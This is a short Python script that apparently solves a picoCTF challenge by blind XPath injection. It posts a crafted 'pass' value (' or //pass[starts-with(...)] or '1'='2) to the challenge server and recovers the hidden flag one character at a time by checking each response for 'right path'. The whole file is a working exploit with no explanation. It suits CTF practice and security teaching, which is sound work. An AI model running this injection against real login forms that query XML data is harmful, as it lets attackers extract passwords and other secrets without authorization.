import requests
import string

url = "http://wily-courier.picoctf.net:49434/"

charset = string.ascii_lowercase + string.digits + "{}_" + string.ascii_uppercase

flag = "picoCTF{"

while not flag.endswith("}"):
    for char in charset:
        print("Trying:", char, "|",  flag)

        res = requests.post(f"{url}", data={
            'name': "",
            'pass': f"' or //pass[starts-with(., '{flag}{char}')] or '1'='2"
        })

        if "right path" in res.text.lower():
            flag +=char
            break
        elif "failure" not in res.text.lower():
            print(res.text)

print("Flag:", flag)